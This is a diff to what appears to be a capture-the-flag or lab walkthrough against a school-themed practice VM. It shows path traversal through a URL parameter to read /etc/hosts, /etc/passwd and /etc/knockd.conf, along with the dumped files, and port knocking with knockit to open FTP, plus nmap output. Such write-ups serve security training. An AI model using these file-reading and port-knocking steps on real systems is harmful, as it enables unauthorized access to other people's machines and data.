@@ -36,7 +36,6 @@ I will start by using [Metasploit Framework](https://github.com/rapid7/metasploi
    PORT    STATE SERVICE
    80/tcp  open  http
    443/tcp open  https
-   MAC Address: 00:0C:29:50:FC:48 (VMware)
    ```
    
 4) Further reconnaissance with [NMAP](https://github.com/nmap/nmap)'s aggressive scan (-A) & [Vulscan](https://github.com/scipag/vulscan)'s NSE script in [Metasploit Framework](https://github.com/rapid7/metasploit-framework) `db_nmap -A --script=vulscan 192.168.233.135`, which gave the following result when accessing it in the database `services`:
@@ -219,4 +218,109 @@ I will start by using [Metasploit Framework](https://github.com/rapid7/metasploi
 
     Exploring the various sections, tabs, and buttons in the new dashboard, the one that stood out the most was `Retrieve User Data`. Clicking on `Retrieve User Data` showed that the URL changed to `https://potatos.potato-school.com/new_dashboard/index.php?data_path=%2Feunchae%2Feunchae_data`. In the URL, the path as to which the data is obtained from was stated, which brought to my mind the attack known as [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).
 
-20) 
+20) Attempting [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal), I decided to look at various files:
+
+    `/etc/hosts`
+    ```
+    127.0.0.1 localhost
+    127.0.1.1 potatos.potato-school.com www.potato-school.com
+    # The following lines are desirable for IPv6 capable hosts
+    ::1 localhost ip6-localhost ip6-loopback
+    ff02::1 ip6-allnodes
+    ff02::2 ip6-allrouters
+    ```
+    
+    `/etc/passwd`
+    ```
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+    _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+    mysql:x:100:108:MySQL Server,,,:/var/lib/mysql:/bin/false
+    messagebus:x:101:109::/nonexistent:/usr/sbin/nologin
+    sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
+    tss:x:103:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+    usbmux:x:104:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+    dnsmasq:x:105:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+    avahi:x:106:113:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+    speech-dispatcher:x:107:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+    fwupd-refresh:x:108:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+    saned:x:109:118::/var/lib/saned:/usr/sbin/nologin
+    geoclue:x:110:119::/var/lib/geoclue:/usr/sbin/nologin
+    polkitd:x:997:997:polkit:/nonexistent:/usr/sbin/nologin
+    rtkit:x:111:120:RealtimeKit,,,:/proc:/usr/sbin/nologin
+    colord:x:112:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+    gnome-initial-setup:x:113:65534::/run/gnome-initial-setup/:/bin/false
+    Debian-gdm:x:114:122:Gnome Display Manager:/var/lib/gdm3:/bin/false
+    bind:x:115:123::/var/cache/bind:/usr/sbin/nologin
+    postfix:x:116:124::/var/spool/postfix:/usr/sbin/nologin
+    dovecot:x:117:126:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
+    dovenull:x:118:127:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
+    malcolm:x:1004:1004::/home/malcolm:/bin/restrictedbash
+    jaeger:x:1005:1005::/home/jaeger:/bin/restrictedbash
+    weile:x:1006:1006::/home/weile:/bin/restrictedbash
+    jasmine:x:1007:1007::/home/jasmine:/bin/restrictedbash
+    charlene:x:1008:1008::/home/charlene:/bin/restrictedbash
+    jasper:x:1009:1009::/home/jasper:/bin/restrictedbash
+    charles:x:1010:1010::/home/charles:/bin/restrictedbash
+    chaewon:x:1013:1013::/home/chaewon:/bin/restrictedbash
+    sakura:x:1014:1014::/home/sakura:/bin/restrictedbash
+    kazuha:x:1015:1015::/home/kazuha:/bin/restrictedbash
+    eunchae:x:1016:1016::/home/eunchae:/bin/restrictedbash
+    yunjin:x:1019:1019::/home/yunjin:/bin/restrictedbash
+    ftp:x:119:128:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+    cabbage:x:1020:1020::/home/cabbage:/bin/sh
+    potato-helpdesk:x:1021:1021::/home/potato-helpdesk:/bin/sh
+    ```
+
+    `/etc/shadow` showed nothing
+
+21) Attempting other methods/angles of attacks didn't yield much results, thus I decided to go back to refer back to the courses that were released on the dashboard. SQLMap attack, Local File Inclusion attack, Command Injection, and Privilege Escalation attack didn't seem to work which made me try the Port Knocking angle. Searching online, the file required for Port Knocking to work is `knockd.conf`. Accessing `/etc/knockd.conf` gave the following output:
+
+    ```
+    [options]
+    UseSyslog
+
+    [openFTP]
+    sequence = 1000,2000
+    seq_timeout = 5
+    command = /usr/sbin/ufw allow 21/tcp
+    tcpflags = syn
+
+    [closeFTP]
+    sequence = 3000
+    seq_timeout = 5
+    command = /usr/sbin/ufw deny 21/tcp
+    tcpflags = syn
+    ```
+
+    This meant that in order to open port 21 (FTP), I have to send TCP SYN packets to port 1000 followed by port 2000 within 5 seconds, which can be achieved by using a [Port Knocking](https://wiki.archlinux.org/title/Port_knocking) tool. My preferred [Port Knocking](https://wiki.archlinux.org/title/Port_knocking) tool of choice is [KnockIt](https://github.com/eliemoutran/KnockIt). Using the command `knockit 192.168.233.135 1000 2000` to conduct [Port Knocking](https://wiki.archlinux.org/title/Port_knocking) & doing a [NMAP](https://github.com/nmap/nmap) right after gives the following output:
+
+    ```
+    Nmap scan report for potatos.potato-school.com (192.168.233.137)
+    Host is up (0.00076s latency).
+    Not shown: 997 filtered tcp ports (no-response)
+    PORT    STATE SERVICE
+    21/tcp  open  ftp
+    80/tcp  open  http
+    443/tcp open  https
+    ```
+
+    As port 21 (ftp) is open, the [Port Knocking](https://wiki.archlinux.org/title/Port_knocking) was a success.
+
+22) Since the ftp port is open, I decided to try to access the Pootato VM via the ftp port.
